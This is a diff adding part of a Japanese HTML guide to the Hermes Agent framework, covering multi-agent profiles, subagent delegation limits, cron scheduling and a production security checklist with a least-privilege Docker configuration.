+              class="ref-url"
+              href="https://hermes-agent.nousresearch.com/docs/user-guide/security#tirith-pre-exec-security-scanning"
+              target="_blank"
+              >…/security#tirith-pre-exec</a
+            >
+          </div>
+          <div class="ref-card">
+            <div class="ref-cat">公式 Security</div>
+            <div class="ref-title">Supply-chain Advisory Checking</div>
+            <a
+              class="ref-url"
+              href="https://hermes-agent.nousresearch.com/docs/user-guide/security#supply-chain-advisory-checking"
+              target="_blank"
+              >…/security#supply-chain-advisory</a
+            >
+          </div>
+          <div class="ref-card">
+            <div class="ref-cat">外部ツール</div>
+            <div class="ref-title">tirith — コマンドスキャナー</div>
+            <a class="ref-url" href="https://github.com/sheeki03/tirith" target="_blank"
+              >github.com/sheeki03/tirith</a
+            >
+          </div>
+        </div>
+      </section>
+
+      <!-- CH9 -->
+      <section class="chapter" id="ch9">
+        <div class="chapter-num">Ch.09 — K-Level: Intermediate</div>
+        <h2 class="chapter-title">プロファイルシステムによる多エージェント管理</h2>
+        <p>
+          プロファイルは独立したHermesホームディレクトリです。各プロファイルは config / .env /
+          SOUL.md / memories / sessions / skills / cron / state.db
+          を個別に保持し、並行して稼働できます。
+        </p>
+
+        <h3 class="section-title">プロファイル作成の4種類</h3>
+        <div class="mermaid-wrap">
+          <div class="mermaid">
+            flowchart LR A["hermes profile create &lt;name&gt;"] --> B{オプション} B -->
+            C["(なし)\n空プロファイル\nスキルのみシード済み"] B --> D["--clone\nconfig+.env+SOUL.md
+            コピー\nメモリ・セッションは新規"] B -->
+            E["--clone-all\n全データ完全コピー\nバックアップ・フォーク用"] B --> F["--clone-from
+            src\n指定プロファイルから複製"]
+          </div>
+        </div>
+
+        <div class="code-block">
+          <span class="code-tag">bash — 役割別エージェント構成例</span
+          ><span class="cm"># 役割別エージェントの作成</span>
+          <span class="cc">hermes profile create</span> coder
+          <span class="cs">--description "コード実装・デバッグ"</span>
+          <span class="cc">hermes profile create</span> researcher
+          <span class="cs">--description "技術調査・文書作成"</span>
+          <span class="cc">hermes profile create</span> ops
+          <span class="cs">--description "インフラ管理・監視"</span>
+
+          <span class="cm"># バックエンドを役割に合わせて設定</span>
+          <span class="cg">coder</span> config set terminal.backend docker
+          <span class="cg">ops</span> config set terminal.backend ssh
+
+          <span class="cm"># 各プロファイルを systemd サービスとして起動</span>
+          <span class="cg">coder</span> gateway install
+          <span class="cm"># hermes-gateway-coder.service</span>
+          <span class="cg">researcher</span> gateway install
+          <span class="cm"># hermes-gateway-researcher.service</span>
+          <span class="cg">ops</span> gateway install
+          <span class="cm"># hermes-gateway-ops.service</span>
+        </div>
+
+        <div class="callout info">
+          <div class="callout-icon">ℹ</div>
+          <div>
+            2つのプロファイルが同じボットトークンを誤って使用した場合、2番目のゲートウェイは起動時に
+            <strong>明確なエラーと競合プロファイル名</strong> で拒否されます（Telegram / Discord /
+            Slack / WhatsApp / Signal で対応）。
+          </div>
+        </div>
+
+        <div class="divider"></div>
+        <div class="ref-grid">
+          <div class="ref-card">
+            <div class="ref-cat">公式ユーザーガイド</div>
+            <div class="ref-title">Profiles: Running Multiple Agents</div>
+            <a
+              class="ref-url"
+              href="https://hermes-agent.nousresearch.com/docs/user-guide/profiles"
+              target="_blank"
+              >…/user-guide/profiles</a
+            >
+          </div>
+          <div class="ref-card">
+            <div class="ref-cat">公式ユーザーガイド</div>
+            <div class="ref-title">Running Many Gateways at Once</div>
+            <a
+              class="ref-url"
+              href="https://hermes-agent.nousresearch.com/docs/user-guide/multi-profile-gateways"
+              target="_blank"
+              >…/user-guide/multi-profile-gateways</a
+            >
+          </div>
+        </div>
+      </section>
+
+      <!-- CH10 -->
+      <section class="chapter" id="ch10">
+        <div class="chapter-num">Ch.10 — K-Level: Advanced</div>
+        <h2 class="chapter-title">サブエージェント委譲と並列処理</h2>
+
+        <h3 class="section-title">delegate_task vs execute_code の使い分け</h3>
+        <div class="table-wrap">
+          <table>
+            <thead>
+              <tr>
+                <th>要素</th>
+                <th>delegate_task</th>
+                <th>execute_code</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td>推論</td>
+                <td>完全な LLM ループ</td>
+                <td>なし（コード実行のみ）</td>
+              </tr>
+              <tr>
+                <td>コンテキスト</td>
+                <td>新規の独立した会話</td>
+                <td>会話なし・スクリプトのみ</td>
+              </tr>
+              <tr>
+                <td>並列度</td>
+                <td>デフォルト3（設定可）</td>
+                <td>シングルスクリプト</td>
+              </tr>
+              <tr>
+                <td>トークンコスト</td>
+                <td>高い</td>
+                <td>低い</td>
+              </tr>
+              <tr>
+                <td>最適用途</td>
+                <td>推論・判断・多段問題解決</td>
+                <td>機械的データ処理・スクリプト化ワークフロー</td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+
+        <h3 class="section-title">並列サブエージェントの深度制限</h3>
+        <div class="mermaid-wrap">
+          <div class="mermaid">
+            flowchart TD P["親エージェント\n(depth 0)"] subgraph D1["depth 1 (max_spawn_depth=1
+            デフォルト)"] L1["子1 role=leaf\n委譲不可"] L2["子2 role=leaf"] L3["子3 role=leaf"] end
+            subgraph D2["depth 2 (max_spawn_depth=2 設定時)"] O1["子1 role=orchestrator\n委譲可能"]
+            G1["孫1"] G2["孫2"] end P --> L1 & L2 & L3 P -->|"depth>=2"| O1 O1 --> G1 & G2
+          </div>
+        </div>
+
+        <h3 class="section-title">良い例 / 悪い例</h3>
+        <div class="compare-grid">
+          <div class="compare-card good">
+            <div class="compare-label">✅ コンテキストを明示的に渡す</div>
+            <div class="compare-code">
+              delegate_task( goal="api/handlers.py の TypeError を修正", context=""" api/handlers.py
+              line 47: NoneType has no attribute 'get'. parse_body()はContent-Type未設定時
+              にNone返却。Python 3.11 使用。 プロジェクト: /home/user/myproject """ )
+            </div>
+          </div>
+          <div class="compare-card bad">
+            <div class="compare-label">❌ サブエージェントは過去を知らない</div>
+            <div class="compare-code">
+              delegate_task( goal="エラーを修正して" # NG: サブエージェントは #
+              新規会話から開始するため # 「エラー」が何かを知らない )
+            </div>
+          </div>
+        </div>
+
+        <div class="callout warning">
+          <div class="callout-icon">⚠</div>
+          <div>
+            <code>max_spawn_depth: 3</code> + <code>max_concurrent_children: 3</code> の場合、最大
+            3×3×3 =
+            <strong>27並列リーフエージェント</strong>
+            が動作します。深度を上げる場合はコストを十分に考慮してください。
+          </div>
+        </div>
+
+        <div class="divider"></div>
+        <div class="ref-grid">
+          <div class="ref-card">
+            <div class="ref-cat">公式 Features</div>
+            <div class="ref-title">Subagent Delegation</div>
+            <a
+              class="ref-url"
+              href="https://hermes-agent.nousresearch.com/docs/user-guide/features/delegation"
+              target="_blank"
+              >…/features/delegation</a
+            >
+          </div>
+        </div>
+      </section>
+
+      <!-- CH11 -->
+      <section class="chapter" id="ch11">
+        <div class="chapter-num">Ch.11 — K-Level: Intermediate→Advanced</div>
+        <h2 class="chapter-title">Cron スケジューラー高度な活用</h2>
+
+        <h3 class="section-title">ジョブチェーニング（context_from）</h3>
+        <div class="mermaid-wrap">
+          <div class="mermaid">
+            flowchart LR J1["Job 1: News Collector\n毎日 7:00\nHN から上位10件収集\n→ raw.md
+            に保存"] J2["Job 2: News Triage\n毎日 7:30\ncontext_from=Job1\n1-10でスコアリング\n→
+            ranked.md"] J3["Job 3: News Brief\n毎日 8:00\ncontext_from=Job2\n3ツイート草案作成\n→
+            Telegram 配信"] J1 -->|"最新出力を注入"| J2 -->|"最新出力を注入"| J3
+          </div>
+        </div>
+
+        <h3 class="section-title">wakeAgent — LLM 呼び出しコストゼロのスキップ</h3>
+        <div class="code-block">
+          <span class="code-tag">~/.hermes/scripts/issue-watcher.py</span
+          ><span class="ck">import</span> json, sys latest = fetch_latest_issue_count() prev =
+          read_state(<span class="cs">"issue_count"</span>)
+
+          <span class="ck">if</span> latest == prev:
+          <span class="cm"># このtickはスキップ — LLMコストゼロ</span>
+          <span class="ck">print</span>(json.dumps({<span class="cs">"wakeAgent"</span>:
+          <span class="ck">False</span>})) sys.exit(<span class="cg">0</span>) write_state(<span
+            class="cs"
+            >"issue_count"</span
+          >, latest) <span class="ck">print</span>(json.dumps({<span class="cs">"wakeAgent"</span>:
+          <span class="ck">True</span>}))
+        </div>
+
+        <h3 class="section-title">no-agent モード（ウォッチドッグ）</h3>
+        <div class="compare-grid">
+          <div class="compare-card good">
+            <div class="compare-label">✅ コストゼロの監視タスク</div>
+            <div class="compare-code">
+              hermes cron create "every 5m" \ --no-agent \ --script memory-watchdog.sh \ --deliver
+              telegram \ --name "memory-watchdog" # stdout 空 = silent tick（通知なし） # stdout
+              あり = Telegram へ配信 # non-zero exit = エラーアラート
+            </div>
+          </div>
+          <div class="compare-card bad">
+            <div class="compare-label">❌ 文脈を前提とした cron プロンプト</div>
+            <div class="compare-code">
+              cronjob( prompt="あのサーバー問題を確認して", schedule="every 5m" ) # NG: cron
+              は独立したセッション # 「あのサーバー」を知らない
+            </div>
+          </div>
+        </div>
+
+        <div class="callout danger">
+          <div class="callout-icon">⛔</div>
+          <div>
+            Cron ジョブのプロンプトは作成・更新時に <strong>プロンプトインジェクション</strong> と
+            <strong>資格情報窃取パターン</strong>
+            がスキャンされます。不可視Unicode、SSHバックドア試行、機密情報窃取ペイロードを含むプロンプトはブロックされます。
+          </div>
+        </div>
+
+        <div class="divider"></div>
+        <div class="ref-grid">
+          <div class="ref-card">
+            <div class="ref-cat">公式 Features</div>
+            <div class="ref-title">Scheduled Tasks (Cron)</div>
+            <a
+              class="ref-url"
+              href="https://hermes-agent.nousresearch.com/docs/user-guide/features/cron"
+              target="_blank"
+              >…/features/cron</a
+            >
+          </div>
+        </div>
+      </section>
+
+      <!-- CH12 -->
+      <section class="chapter" id="ch12">
+        <div class="chapter-num">Ch.12 — K-Level: Advanced</div>
+        <h2 class="chapter-title">本番デプロイメント チェックリスト</h2>
+
+        <h3 class="section-title">必須 10 項目</h3>
+        <ul class="step-list">
+          <li class="step-item">
+            <div class="step-num">1</div>
+            <div class="step-content">
+              <div class="step-title">明示的な allowlist を設定</div>
+              <div class="step-desc">
+                <code>GATEWAY_ALLOW_ALL_USERS=true</code> は本番禁止。<code
+                  >TELEGRAM_ALLOWED_USERS=...</code
+                >
+                等を設定。
+              </div>
+            </div>
+          </li>
+          <li class="step-item">
+            <div class="step-num">2</div>
+            <div class="step-content">
+              <div class="step-title">コンテナバックエンドを使用</div>
+              <div class="step-desc">
+                <code>terminal.backend: docker</code
+                >。危険コマンドチェックが不要になり完全自動化が可能。
+              </div>
+            </div>
+          </li>
+          <li class="step-item">
+            <div class="step-num">3</div>
+            <div class="step-content">
+              <div class="step-title">リソース制限を設定</div>
+              <div class="step-desc">
+                <code>container_cpu / container_memory / container_disk</code>
+                に必要最小限の値を設定。
+              </div>
+            </div>
+          </li>
+          <li class="step-item">
+            <div class="step-num">4</div>
+            <div class="step-content">
+              <div class="step-title">.env のパーミッション保護</div>
+              <div class="step-desc">
+                <code>chmod 600 ~/.hermes/.env</code> を必ず実行。バージョン管理に含めない。
+              </div>
+            </div>
+          </li>
+          <li class="step-item">
+            <div class="step-num">5</div>
+            <div class="step-content">
+              <div class="step-title">DM Pairing を有効化</div>
+              <div class="step-desc">
+                ユーザーIDのハードコードの代わりにペアリングコードを使用。
+              </div>
+            </div>
+          </li>
+          <li class="step-item">
+            <div class="step-num">6</div>
+            <div class="step-content">
+              <div class="step-title">command_allowlist を定期監査</div>
+              <div class="step-desc">
+                <code>hermes config edit</code> で定期的に確認し、不要なパターンを削除。
+              </div>
+            </div>
+          </li>
+          <li class="step-item">
+            <div class="step-num">7</div>
+            <div class="step-content">
+              <div class="step-title">terminal.cwd を明示設定</div>
+              <div class="step-desc">機密ディレクトリからの操作を防止。絶対パスで指定する。</div>
+            </div>
+          </li>
+          <li class="step-item">
+            <div class="step-num">8</div>
+            <div class="step-content">
+              <div class="step-title">root 以外のユーザーで実行</div>
+              <div class="step-desc">専用の非特権ユーザーでゲートウェイプロセスを実行。</div>
+            </div>
+          </li>
+          <li class="step-item">
+            <div class="step-num">9</div>
+            <div class="step-content">
+              <div class="step-title">cron_mode: deny を維持</div>
+              <div class="step-desc">
+                デフォルト値のまま変更しない。headless cron での危険コマンド自動実行を防止。
+              </div>
+            </div>
+          </li>
+          <li class="step-item">
+            <div class="step-num">10</div>
+            <div class="step-content">
+              <div class="step-title">定期アップデート &amp; アドバイザリーチェック</div>
+              <div class="step-desc">
+                <code>hermes update</code> +
+                <code>hermes doctor</code> を週次で実行。サプライチェーン汚染に素早く対応。
+              </div>
+            </div>
+          </li>
+        </ul>
+
+        <h3 class="section-title">最小権限 Docker 本番設定</h3>
+        <div class="code-block">
+          <span class="code-tag">~/.hermes/config.yaml — 本番推奨</span
+          ><span class="cc">terminal</span>: <span class="cc">backend</span>:
+          <span class="cs">docker</span> <span class="cc">docker_image</span>:
+          <span class="cs">"nikolaik/python-nodejs:python3.11-nodejs20"</span>
+          <span class="cc">docker_forward_env</span>: []
+          <span class="cm"># 空 = コンテナに機密情報を渡さない</span>
+          <span class="cc">container_cpu</span>: <span class="cg">1</span>
+          <span class="cc">container_memory</span>: <span class="cg">2048</span>
+          <span class="cm"># 2GB</span> <span class="cc">container_disk</span>:
+          <span class="cg">10240</span> <span class="cm"># 10GB</span>
+          <span class="cc">container_persistent</span>: <span class="ck">false</span>
+          <span class="cm"># ephemeral</span> <span class="cc">cwd</span>:
+          <span class="cs">"/workspace"</span>
+
+          <span class="cc">approvals</span>: <span class="cc">mode</span>:
+          <span class="cs">smart</span> <span class="cc">timeout</span>: <span class="cg">120</span>
+          <span class="cc">cron_mode</span>: <span class="cs">deny</span>
+          <span class="cc">destructive_slash_confirm</span>: <span class="ck">true</span>
+
+          <span class="cc">security</span>: <span class="cc">tirith_enabled</span>:
+          <span class="ck">true</span> <span class="cc">tirith_fail_open</span>:
+          <span class="ck">false</span> <span class="cm"># 高セキュリティ</span>
+          <span class="cc">allow_private_urls</span>: <span class="ck">false</span>
+          <span class="cc">allow_lazy_installs</span>: <span class="ck">false</span>
+        </div>
+
+        <div class="divider"></div>
+        <div class="ref-grid">
+          <div class="ref-card">
+            <div class="ref-cat">公式 Security</div>
+            <div class="ref-title">Best Practices for Production Deployment</div>
+            <a
+              class="ref-url"
+              href="https://hermes-agent.nousresearch.com/docs/user-guide/security#best-practices-for-production-deployment"
+              target="_blank"
+              >…/security#best-practices</a
+            >
+          </div>
+          <div class="ref-card">
+            <div class="ref-cat">公式ユーザーガイド</div>
+            <div class="ref-title">Checkpoints &amp; Rollback</div>
+            <a
+              class="ref-url"
+              href="https://hermes-agent.nousresearch.com/docs/user-guide/checkpoints-and-rollback"
+              target="_blank"
+              >…/checkpoints-and-rollback</a
+            >
+          </div>
+        </div>
+      </section>
+
+      <!-- REFERENCES -->
+      <section class="chapter" id="refs">
+        <div class="chapter-num">References — 全参照 URL</div>
+        <h2 class="chapter-title">参考リソース一覧</h2>
+
+        <h3 class="section-title">公式ドキュメント</h3>
+        <div class="ref-grid">
+          <div class="ref-card">
+            <div class="ref-cat">公式ホーム</div>
+            <div class="ref-title">Hermes Agent 公式サイト</div>
+            <a class="ref-url" href="https://hermes-agent.nousresearch.com/" target="_blank"
+              >hermes-agent.nousresearch.com</a
+            >
+          </div>
+          <div class="ref-card">
+            <div class="ref-cat">GitHub</div>
+            <div class="ref-title">NousResearch/hermes-agent</div>
+            <a class="ref-url" href="https://github.com/NousResearch/hermes-agent" target="_blank"
+              >github.com/NousResearch/hermes-agent</a
+            >
+          </div>
+          <div class="ref-card">
+            <div class="ref-cat">Security</div>
+            <div class="ref-title">Security Model (完全ガイド)</div>
+            <a
+              class="ref-url"
+              href="https://hermes-agent.nousresearch.com/docs/user-guide/security"
+              target="_blank"
+              >…/user-guide/security</a
+            >
+          </div>
+          <div class="ref-card">
+            <div class="ref-cat">Architecture</div>
+            <div class="ref-title">Architecture Overview</div>
+            <a
+              class="ref-url"
+              href="https://hermes-agent.nousresearch.com/docs/developer-guide/architecture"
+              target="_blank"
+              >…/developer-guide/architecture</a
+            >
+          </div>
+          <div class="ref-card">
+            <div class="ref-cat">Architecture</div>
+            <div class="ref-title">Agent Loop Internals</div>
+            <a
+              class="ref-url"
+              href="https://hermes-agent.nousresearch.com/docs/developer-guide/agent-loop"
+              target="_blank"
+              >…/developer-guide/agent-loop</a
+            >
+          </div>
+          <div class="ref-card">
+            <div class="ref-cat">Architecture</div>
+            <div class="ref-title">Prompt Assembly</div>
+            <a
+              class="ref-url"
+              href="https://hermes-agent.nousresearch.com/docs/developer-guide/prompt-assembly"
+              target="_blank"
+              >…/developer-guide/prompt-assembly</a
+            >
+          </div>
+          <div class="ref-card">
+            <div class="ref-cat">Architecture</div>
+            <div class="ref-title">Context Compression &amp; Caching</div>
+            <a
+              class="ref-url"
+              href="https://hermes-agent.nousresearch.com/docs/developer-guide/context-compression-and-caching"
+              target="_blank"
+              >…/context-compression-and-caching</a
+            >
+          </div>
+          <div class="ref-card">
+            <div class="ref-cat">Architecture</div>
+            <div class="ref-title">Provider Runtime Resolution</div>
+            <a
+              class="ref-url"
+              href="https://hermes-agent.nousresearch.com/docs/developer-guide/provider-runtime"
+              target="_blank"
+              >…/developer-guide/provider-runtime</a
+            >
+          </div>
+          <div class="ref-card">
+            <div class="ref-cat">Architecture</div>
+            <div class="ref-title">Gateway Internals</div>
+            <a
+              class="ref-url"
+              href="https://hermes-agent.nousresearch.com/docs/developer-guide/gateway-internals"
+              target="_blank"
+              >…/developer-guide/gateway-internals</a
+            >
+          </div>
+          <div class="ref-card">
+            <div class="ref-cat">Features</div>
+            <div class="ref-title">Subagent Delegation</div>
+            <a
+              class="ref-url"
+              href="https://hermes-agent.nousresearch.com/docs/user-guide/features/delegation"
+              target="_blank"
+              >…/features/delegation</a
+            >
+          </div>
+          <div class="ref-card">
+            <div class="ref-cat">Features</div>
+            <div class="ref-title">Scheduled Tasks (Cron)</div>
+            <a
+              class="ref-url"
+              href="https://hermes-agent.nousresearch.com/docs/user-guide/features/cron"
+              target="_blank"
+              >…/features/cron</a
+            >
+          </div>
+          <div class="ref-card">
+            <div class="ref-cat">Features</div>
+            <div class="ref-title">Memory Providers</div>
+            <a
+              class="ref-url"
+              href="https://hermes-agent.nousresearch.com/docs/user-guide/features/memory-providers"
+              target="_blank"
+              >…/features/memory-providers</a
+            >
+          </div>
+          <div class="ref-card">
+            <div class="ref-cat">User Guide</div>
+            <div class="ref-title">Profiles: Multiple Agents</div>
+            <a
+              class="ref-url"
+              href="https://hermes-agent.nousresearch.com/docs/user-guide/profiles"
+              target="_blank"
+              >…/user-guide/profiles</a
+            >
+          </div>
+          <div class="ref-card">
+            <div class="ref-cat">User Guide</div>
+            <div class="ref-title">Docker</div>
+            <a
+              class="ref-url"
+              href="https://hermes-agent.nousresearch.com/docs/user-guide/docker"
+              target="_blank"
+              >…/user-guide/docker</a
+            >
+          </div>
+          <div class="ref-card">
+            <div class="ref-cat">Reference</div>
+            <div class="ref-title">CLI Commands</div>
+            <a
+              class="ref-url"
+              href="https://hermes-agent.nousresearch.com/docs/reference/cli-commands"
+              target="_blank"
+              >…/reference/cli-commands</a
+            >
+          </div>
+          <div class="ref-card">
+            <div class="ref-cat">Reference</div>
+            <div class="ref-title">Environment Variables</div>
+            <a
+              class="ref-url"
+              href="https://hermes-agent.nousresearch.com/docs/reference/environment-variables"
+              target="_blank"
+              >…/reference/environment-variables</a
+            >
+          </div>
+        </div>
+
+        <h3 class="section-title">関連ツール &amp; エコシステム</h3>
+        <div class="ref-grid">
+          <div class="ref-card">
+            <div class="ref-cat">Security Tool</div>
+            <div class="ref-title">tirith — コマンドスキャナー</div>
+            <a class="ref-url" href="https://github.com/sheeki03/tirith" target="_blank"
+              >github.com/sheeki03/tirith</a
+            >
+          </div>
+          <div class="ref-card">
+            <div class="ref-cat">Memory Provider</div>
+            <div class="ref-title">Honcho — ユーザーモデリング</div>
+            <a class="ref-url" href="https://github.com/plastic-labs/honcho" target="_blank"
+              >github.com/plastic-labs/honcho</a
+            >
+          </div>
+          <div class="ref-card">
+            <div class="ref-cat">MCP Tool</div>
+            <div class="ref-title">computer-use-linux</div>
+            <a
+              class="ref-url"
+              href="https://github.com/avifenesh/computer-use-linux"
+              target="_blank"
+              >github.com/avifenesh/computer-use-linux</a
+            >
+          </div>
+          <div class="ref-card">
+            <div class="ref-cat">Skills Hub</div>
+            <div class="ref-title">agentskills.io — オープンスキル標準</div>
+            <a class="ref-url" href="https://agentskills.io/specification" target="_blank"
+              >agentskills.io/specification</a
+            >
+          </div>
+          <div class="ref-card">
+            <div class="ref-cat">Skills Hub</div>
+            <div class="ref-title">skills.sh — Vercel スキルディレクトリ</div>
+            <a class="ref-url" href="https://skills.sh/" target="_blank">skills.sh</a>
+          </div>
+          <div class="ref-card">
+            <div class="ref-cat">Community</div>
+            <div class="ref-title">Nous Research Discord</div>
+            <a class="ref-url" href="https://discord.gg/NousResearch" target="_blank"
+              >discord.gg/NousResearch</a
+            >
+          </div>
+        </div>
+      </section>
+
+      <div class="divider"></div>
+    </div>
+
+    <footer class="footer">
+      <p>
+        Built from
+        <a href="https://hermes-agent.nousresearch.com/" target="_blank"
+          >hermes-agent.nousresearch.com</a
+        >
+        &amp;
+        <a href="https://github.com/NousResearch/hermes-agent" target="_blank"
+          >github.com/NousResearch/hermes-agent</a
+        >
+      </p>
+      <p style="margin-top: 0.4rem">
+        Hermes Agent v0.15.2 — MIT License — Nous Research — 2026.06.03
+      </p>
+    </footer>
+
+    <script src="https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.min.js"></script>
+    <script>
+      mermaid.initialize({
+        startOnLoad: true,
+        theme: 'dark',
+        themeVariables: {
+          darkMode: true,
+          background: '#070b16',
+          mainBkg: '#0d1428',
+          nodeBorder: '#00e5ff',
+          clusterBkg: '#111930',
+          titleColor: '#00ff88',
+          edgeLabelBackground: '#0a0f1e',
+          nodeTextColor: '#e8edf8',
+          lineColor: '#00e5ff',
+          primaryColor: '#0d1428',
+          primaryBorderColor: '#00e5ff',
+          primaryTextColor: '#e8edf8',
+          secondaryColor: '#111930',
+          tertiaryColor: '#0a0f1e',
+          fontFamily: 'IBM Plex Sans JP, monospace',
+          fontSize: '13px',
+        },
+        flowchart: { curve: 'basis', useMaxWidth: true },
+        securityLevel: 'loose',
+      });
+    </script>
+  </body>
+</html>
